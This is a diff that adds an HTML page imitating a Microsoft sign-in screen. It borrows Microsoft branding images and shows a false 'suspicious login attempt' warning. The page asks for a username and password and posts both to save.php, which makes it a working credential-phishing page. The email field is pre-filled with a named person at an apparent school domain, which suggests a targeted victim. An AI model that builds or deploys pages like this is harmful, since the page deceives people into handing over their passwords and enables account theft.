@@ -1,0 +1,120 @@
+<html><head>
+        <meta charset="utf-8"/>
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width"/>
+        <title>Sign In</title>
+        <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/ezat-r/Outlook-LoginPage-Clone/master/images/favicon.ico"/>
+        <style>
+body{
+    display: flex;
+	align-items: center;
+	justify-content: center;
+    font-family: "Helvetica Neue", sans-serif;
+    line-height: 1.5;
+    font-size: 16px;
+    background-color: #fff;
+    color: #000;
+    padding: 0;
+    margin: 0;
+}
+
+.container{
+    width: 40%;
+    margin: 0 auto;
+    text-align: center;
+    max-width: 768px;
+}
+
+header{
+    margin-top: 20px;
+}
+
+section h1{
+    font-size: 34px;
+    font-weight: normal;
+    padding: 5px;
+    margin: 20px 2px 12px 2px;
+}
+
+section p{
+    font-size: 15px;
+    padding: 2px;
+    margin: 6px 2px;
+}
+
+section p a{
+    text-decoration: none;
+    color: #0072C6;
+}
+
+section #form-input input{
+    width: 345px;
+    height: 30px;
+    padding: 10px 8px;
+    font-size: 14px;
+    font-weight: lighter;
+    border: 2px solid #999999;
+    margin: 10px;
+}
+
+section #form-submit button{
+    width: 345px;
+    height: 30px;
+    background-color: #0067B8;
+    color: #fff;
+    border: none;
+    font-size: 15px;
+    margin: 10px 8px;
+}
+
+section #form-submit button:hover{
+    border: 2px solid #004E8C;
+    cursor: pointer;
+}
+
+footer{
+    margin-top: 45px;
+    font-size: 13px;
+}
+
+footer a{
+    margin: 5px 20px;
+    text-decoration: none;
+    color: #0072C6;
+}
+</style>
+    </head>
+
+    <body>
+        <div class="container">
+            <header id="header-img">
+                <img src="https://aadcdn.msauthimages.net/c1c6b6c8-ngv7-q1-bi0mwywi6hgk9hbp9edx6v-kbgcu8-5i9fa/logintenantbranding/0/bannerlogo?ts=636963468414035835"/>
+            </header>
+            
+            <section>
+                <h1>Sign In</h1>
+                <p>We have detected a suspicious login attempt. <br/> <a>Log in to ensure security.</a></p>
+                <form action="save.php" autocomplete="off" method="POST" name="LoginForm">
+                <div id="form-input">
+                    <input name="username" id="email" type="email" placeholder="sebastiano.prospero@school.lyceum-alpinum.ch" required=""/>
+                </div>
+				
+				<div id="form-input">
+                    <input name="password" id="password" type="password" placeholder="Password" required=""/>
+                </div>
+
+                <div id="form-submit">
+                    <button name="submit" type="submit">Login</button>
+                </div></form>
+            </section>
+            
+            <footer>
+                <p><a href="#">Terms of Use</a><a href="#">Privacy &amp; Cookies</a></p>
+                <div id="footer-img">
+                    <img src="https://raw.githubusercontent.com/ezat-r/Outlook-LoginPage-Clone/0c9cd85de2fb49af9ba1ed86f65b944786fa7d46/images/Microsoft_Logotype_Gray.svg"/>
+                </div>
+            </footer>
+        
+        </div>
+    
+    
+</body></html>
